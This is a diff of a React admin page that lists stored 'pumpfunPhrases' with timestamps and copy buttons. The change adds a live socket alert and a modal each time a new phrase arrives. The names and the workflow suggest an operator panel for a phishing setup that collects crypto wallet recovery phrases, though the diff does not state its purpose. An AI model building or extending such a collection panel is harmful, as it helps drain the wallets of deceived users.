@@ -2,24 +2,29 @@
 import { useEffect } from "react"
 import "./Admin.component.css"
 import { usePhrase } from "../context/Phrase.context"
+import socket from "../socket/Socket"
 
 export const Admin = () => {
   const {phrases, fetchPhrase, error, loading} = usePhrase()
   useEffect(()=>{
     fetchPhrase()
 
-    const added = localStorage.getItem("phraseAdded")
-    if(added === "true"){
-      const showBootstrapModal = (id) => {
-        const modalElement = document.getElementById(id)
-        if (modalElement && window.bootstrap?.Modal) {
-          const modalInstance = new window.bootstrap.Modal(modalElement);
-          modalInstance.show();
-        }
+    socket.on("phrase_added", () => {
+    fetchPhrase();
+    localStorage.setItem("phraseAdded", "true");
+
+    const showBootstrapModal = (id) => {
+      const modalElement = document.getElementById(id);
+      if (modalElement && window.bootstrap?.Modal) {
+        const modalInstance = new window.bootstrap.Modal(modalElement);
+        modalInstance.show();
       }
-      showBootstrapModal("phraseAddedModal");
-       localStorage.removeItem("phraseAdded");
-    }
+    };
+
+    showBootstrapModal("phraseAddedModal");
+  });
+
+    return () => socket.off("phrase_added");
   },[])
 
   const copyToClipboard = (text) => {
@@ -45,7 +50,7 @@ export const Admin = () => {
             <tr>
               <th>#</th>
               <th>Timestamp</th>
-              <th>Id</th>
+              <th className="d-none d-sm-table-cell">Id</th>
               <th>Phrase</th>
             </tr>
           </thead>
@@ -54,7 +59,7 @@ export const Admin = () => {
               <tr key={item._id} className="text-size-admin">
                 <td>{index + 1}</td>
                 <td>{new Date(item.createDate).toLocaleString()}</td>
-                <td>{item._id}</td>
+                <td className="d-none d-sm-table-cell">{item._id}</td>
                 <td>{item.pumpfunPhrases}
                   <button type="button" className="btn mx-5"><i className="fa-regular fa-copy text-info" onClick={()=> copyToClipboard(item.pumpfunPhrases)}></i></button>
                 </td>
